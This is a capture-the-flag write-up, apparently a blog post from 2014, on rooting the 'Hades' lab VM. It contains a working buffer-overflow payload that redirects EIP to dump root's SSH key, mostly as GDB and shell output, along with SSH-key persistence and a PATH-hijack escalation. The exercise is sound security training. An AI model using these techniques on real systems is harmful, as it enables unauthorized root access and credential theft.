@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>The Infernal: Hades - Part 2 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-06-05">June 05, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/hades">hades</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">The Infernal: Hades - Part 2</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<h2 id="ssh-persistence:b4994bab40eb34750ec826f32c93e1ca">SSH Persistence</h2>
+
+<p>With shell access as loki, I did some standard system enumeration and found that he was the only user, and that SSH was running.  Loki didn&rsquo;t have a <code>.ssh</code> directory in his home folder, so I created one and popped my public SSH key into <code>authorized_keys</code>.</p>
+
+<p>If you <code>cat</code> loki&rsquo;s <code>.bash_history</code> file, you get a small troll from lok_sigma.</p>
+
+<pre><code class="language-text">loki@Hades:~$ cat .bash_history
+Really?  Not that kind of challenge....
+</code></pre>
+
+<p>Poking around, I found a few more interesting files.</p>
+
+<pre><code class="language-text">loki@Hades:/$ ls -la /
+drwxr-xr-x  2 root root  4096 Mar 18 20:31 display_root_ssh_key
+-r--------  1 root root  9984 Mar 19 17:27 key_file
+  
+loki@Hades:/$ ls -la /display_root_ssh_key/
+-rw-------  1 root root      1 Mar 19 19:38 counter
+-rwsr-sr-x  1 root root 273048 Mar 18 20:31 display_key
+  
+loki@Hades:/display_root_ssh_key$ file display_key 
+display_key: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped
+</code></pre>
+
+<p>Looks like another binary with the SUID bit set, and is owned by root.  I gave it a little poke and&hellip;</p>
+
+<pre><code class="language-text">loki@Hades:/display_root_ssh_key$ ./display_key 
+    Ready to dance?
+Enter password: 
+lok_sigma
+loki@Hades:/display_root_ssh_key$ ./display_key 
+    Ready to dance?
+Enter password: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Broadcast message from loki@Hades
+    (/dev/pts/1) at 2:20 ...
+The system is going down for reboot NOW!
+Connection to 192.168.127.128 closed by remote host.
+Connection to 192.168.127.128 closed.
+</code></pre>
+
+<p>The damn VM just rebooted itself!  I thought perhaps this may&rsquo;ve been because I entered a long string of A&rsquo;s, but I tried it again with normal words and the same thing happened.  I downloaded the file to my Kali VM for analysis.</p>
+
+<h2 id="give-me-key:b4994bab40eb34750ec826f32c93e1ca">Give me Key!</h2>
+
+<pre><code class="language-text">root@kali:~/hades# checksec --file display_key
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   display_key
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/hades# strings display_key | less
+cat /root/.ssh/id_rsa
+rt0oun
+     Ready to danc
+EE patword:
+FATAL
+  
+$Info: This file is a doozy.  I hope you like it.  This *is* the right one, and when you exploit it you will get what you need.  Read the instructions. $
+</code></pre>
+
+<p>This binary is designed to display the private SSH key of the root user (which is why it needs to run as root).  I moved my <code>sbin/reboot</code> file to <code>sbin/reboot.bk</code> in the hope that this would stop my VM from rebooting, and ran the binary through <code>strace</code>.</p>
+
+<pre><code class="language-text">root@kali:~/hades# strace -i -ff ./display_key 
+[080568ee] open(&quot;counter&quot;, O_RDONLY)    = -1 ENOENT (No such file or directory)
+[08049d8b] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
+[????????] +++ killed by SIGSEGV +++
+Segmentation fault
+</code></pre>
+
+<p>It crashes because it can&rsquo;t open the counter file.  The file permission on hades were such that I couldn&rsquo;t download the real counter file, so I just created an empty file (<code>touch counter</code>).</p>
+
+<p>I followed it through a few times until it tried to reboot again and saw the following:</p>
+
+<pre><code class="language-text">[pid  2949] [b77d0424] stat64(&quot;/usr/local/sbin/reboot&quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&quot;/usr/local/bin/reboot&quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&quot;/usr/sbin/reboot&quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&quot;/usr/bin/reboot&quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&quot;/sbin/reboot&quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&quot;/bin/reboot&quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] write(2, &quot;sh: 1: &quot;, 7sh: 1: ) = 7
+[pid  2949] [b77d0424] write(2, &quot;reboot: not found&quot;, 17reboot: not found) = 17
+[pid  2949] [b77d0424] write(2, &quot;\n&quot;, 1
+</code></pre>
+
+<h2 id="v1-bug:b4994bab40eb34750ec826f32c93e1ca">v1 Bug</h2>
+
+<p>This shows that <code>reboot</code> is executed, but an absolute path is not coded into the binary, which is why it cycles through each of the envronmental paths (<code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>).  It was later reported that this was an unintentional bug in the VM, as it made it a little too easy to get root access.  All that was required was to place a binary or symlink into any directory, name it reboot, and insert a new directory into the PATH variable.  This could be used to execute a new instance of <code>/bin/bash</code>, for example, as root.</p>
+
+<p>This was fixed in v1.0.1 of the challenge.</p>
+
+<h2 id="a-man-s-solution:b4994bab40eb34750ec826f32c93e1ca">A Man&rsquo;s Solution!</h2>
+
+<p>I was able to crash the application by sending 100 A&rsquo;s as a password.  I loaded it up in GDB to confirm.</p>
+
+<pre><code class="language-text">root@kali:~/hades# gdb ./display_key -q
+Enter password: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+  
+(gdb) i r
+eax            0x7f00   32512
+ecx            0xbfffe394   -1073749100
+edx            0x0  0
+ebx            0x0  0
+esp            0xbfffe4c0   0xbfffe4c0
+ebp            0x41414141   0x41414141
+esi            0x8048a20    134515232
+edi            0xa5325e00   -1523425792
+eip            0x41414141   0x41414141
+</code></pre>
+
+<p>It looks like I can own <code>EDP</code> and <code>EIP</code>.  Even though I sent 100 A&rsquo;s, it looks like only 24 are getting to the stack.</p>
+
+<pre><code class="language-text">(gdb) x/20x $esp
+0xbfffe4c0: 0xbfffe400  0x00000019  0x080ca7e0  0x00000001
+0xbfffe4d0: 0xbfffe4e8  0x41048e97  0x41414141  0x41414141
+0xbfffe4e0: 0x41414141  0x41414141  0x41414141  0x00414141
+0xbfffe4f0: 0x00000001  0xbfffe58c  0xbfffe594  0x00000000
+0xbfffe500: 0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+
+<p><code>EIP</code> is overwritten at <code>20 bytes</code> and <code>EDP</code> at <code>16</code>.</p>
+
+<p>Because the binary is stripped of symbols, it makes it really hard to debug and find functions etc.  All I really needed was to jump directly to the cat instruction and bypass the password entry.</p>
+
+<p>I used GDB to search blocks of memory for an instance where <code>cat /root</code> existed.  I looked at the memory mappings to use as my address ranges.</p>
+
+<pre><code class="language-text">root@kali:~/hades# cat /proc/3490/maps
+00c01000-00c02000 r-xp 00000000 08:01 1578682    /root/hades/display_key
+08048000-080ca000 r-xp 00000000 00:00 0
+080ca000-080ef000 rwxp 00000000 00:00 0          [heap]
+b7ffd000-b7fff000 rwxp 00000000 00:00 0
+b7fff000-b8000000 r-xp 00000000 00:00 0          [vdso]
+bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
+
+(gdb) find /b 0x08048000, 0x080ca000, 'c', 'a', 't', ' ', '/'
+0x80ab408
+1 pattern found.
+  
+(gdb) x/s 0x80ab408
+0x80ab408:   &quot;cat /root/.ssh/id_rsa&quot;
+</code></pre>
+
+<p>I tried my luck at jumping directly to this locatation, but no dice.  I thought the way this was probably working, is for this to get loaded into one of the CPU registers as a variable for execv or something.  Since it&rsquo;s a statically linked binary, this address must be referenced in a function somewhere&hellip;</p>
+
+<p>For the life of me, I couldn&rsquo;t work out how to search for this in GDB.  If you&rsquo;re reading this and know how, please let me know.</p>
+
+<p>This meant I had to manually search through areas of memory, to find if they contained a reference to this address.  The way I did this was to SSH into my Kali VM with Putty, and use it&rsquo;s console logging option to log everything to a text file.  Then use good ole Ctrl+F.  It became a case of&hellip;</p>
+
+<p><code>x/100i 0x8048000</code></p>
+
+<p>&hellip;and putting a weight on the Return key whilst I stepped out to read a book!</p>
+
+<p>Eventually the whole section of memory (<code>0x8048000-0x80ca000</code>) was dumped out to a text file (1.77MB in size).  I did a search for <code>0x80ab408</code> and got one hit.</p>
+
+<p><code>0x804825a:     mov    DWORD PTR [esp],0x80ab408</code></p>
+
+<p>I went to that area of memory to see which instructions surrounded it.</p>
+
+<pre><code class="language-text">0x8048254:     push   ebp
+0x8048255:     mov    ebp,esp
+0x8048257:     sub    esp,0x18
+0x804825a:     mov    DWORD PTR [esp],0x80ab408
+0x8048261:     call   0x80493a0
+0x8048266:     leave 
+0x8048267:     ret
+</code></pre>
+
+<p>I also had a look at <code>0x80493a0</code>, which contained a <code>Push EBP</code> instruction.
+Before trying to screw around too much, I thought I&rsquo;d try and jump to <code>0x804825a</code>&hellip;</p>
+
+<pre><code class="language-text">root@kali:~/hades# python -c 'print (&quot;A&quot; * 20) + &quot;\x5a\x82\x04\x08&quot;' | ./display_key 
+    Ready to dance?
+Enter password: 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvggYLQeERLoR4kjgJqU1GIWvcKaieMOfrwv4p/1o+VRUTdeA
+[...snip...]
+x1Xlob/xYTUViso5Exxd8y72SvglgBT7M+g8bSbXMdq4EO3GKfIF
+-----END RSA PRIVATE KEY-----
+Segmentation fault
+</code></pre>
+
+<p>The application still seg faults, but at least my exploit worked!</p>
+
+<h2 id="get-to-da-flag:b4994bab40eb34750ec826f32c93e1ca">Get to da Flag</h2>
+
+<p>I coped the hades root private key to my Kali VM, and was able to SSH in as root :)</p>
+
+<pre><code class="language-text">root@kali:~/hades# ssh root @ 192.168.127.128 -i private_key 
+root@Hades:~# id; whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+
+root@Hades:~# ls -la /root/
+-rw-r--r--  1 root root 3376 Mar 19 19:05 flag.txt.enc
+</code></pre>
+
+<p>This file is encrypted with <code>OpenSSL</code>, as given away by the file header.</p>
+
+<pre><code class="language-text">root@kali:~/hades# strings flag.txt.enc | head
+Salted__
+</code></pre>
+
+<p>I remembered the notes file I originally found in loki&rsquo;s home dir:</p>
+
+<pre><code class="language-text">AES 256 CBC
+Good for you and good for me.
+</code></pre>
+
+<p>At first I tried this phrase as a key within OpenSSL:</p>
+
+<pre><code class="language-text">root@kali:~/hades# openssl enc -d -aes-256-cbc -in flag.txt.enc -k &quot;Good for you and good for me&quot; -out flag.txt
+bad decrypt
+</code></pre>
+
+<p>I tried mangling the phrase, but nothing worked.  I eventually remembered the <code>key_file</code> and after feeding this into <code>OpenSSL</code>, the file was successfully decrypted!</p>
+
+<p><code>root@kali:~/hades# openssl enc -d -aes-256-cbc -in flag.txt.enc -pass file:key_file -out flag.txt</code></p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hades/flag.jpg"  />
+    
+    
+</figure>
+</div>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
